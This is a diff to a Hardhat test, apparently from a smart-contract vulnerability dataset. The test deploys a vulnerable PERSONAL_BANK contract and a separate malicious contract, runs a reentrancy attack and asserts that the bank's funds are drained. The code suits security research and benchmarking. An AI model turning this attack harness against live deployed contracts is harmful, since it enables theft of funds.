@@ -1,6 +1,6 @@
 const { expect } = require("chai");
-
-describe("Reentrancy Attack", function () {
+const { ethers } = require("hardhat");
+describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol", function () {
   let PersonalBank;
   let personalBank;
   let MaliciousContract;
@@ -12,31 +12,34 @@ describe("Reentrancy Attack", function () {
     // Deploy LogFile contract
     LogFile = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:LogFile");
     logFile = await LogFile.deploy();
+    await logFile.waitForDeployment();
 
     // Deploy PersonalBank contract with LogFile address
     PersonalBank = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:PERSONAL_BANK");
     personalBank = await PersonalBank.deploy();
-    await personalBank.Initialized();
-    await personalBank.SetLogFile(logFile.address); // Set LogFile address after deployment
+    await personalBank.waitForDeployment();
+    await personalBank.SetLogFile(logFile.target); // Set LogFile address after deployment
 
     // Deploy MaliciousContract with PersonalBank address
-    MaliciousContract = await ethers.getContractFactory("MaliciousContract");
-    maliciousContract = await MaliciousContract.deploy(personalBank.address);
+    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f_attack.sol:MaliciousContract");
+    maliciousContract = await MaliciousContract.deploy(personalBank.target);
   });
 
   it("should successfully drain funds through reentrancy attack", async function () {
     // Initial deposit to PersonalBank contract
-    await personalBank.Deposit({ value: ethers.utils.parseEther("2") });
+    await personalBank.Deposit({ value: ethers.parseEther("2") });
 
+    //await maliciousContract.personalBank.Deposit({ value: ethers.parseEther("2") });
+    await maliciousContract.deposit({value:  ethers.parseEther("1")});
     // Perform reentrancy attack through MaliciousContract
-    await maliciousContract.attack({ value: ethers.utils.parseEther("1") });
+    await maliciousContract.attack({ value: ethers.parseEther("1") });
 
     // Check balances after attack
-    const personalBankBalance = await ethers.provider.getBalance(personalBank.address);
-    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.address);
+    const personalBankBalance = await ethers.provider.getBalance(personalBank.target);
+    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);
 
     // Verify the attack was successful
-    expect(personalBankBalance).to.equal(ethers.utils.parseEther("0"));
-    expect(maliciousContractBalance).to.equal(ethers.utils.parseEther("1"));
+    expect(personalBankBalance).to.equal(ethers.parseEther("0"));
+    expect(maliciousContractBalance).to.equal(ethers.parseEther("4"));
   });
 });
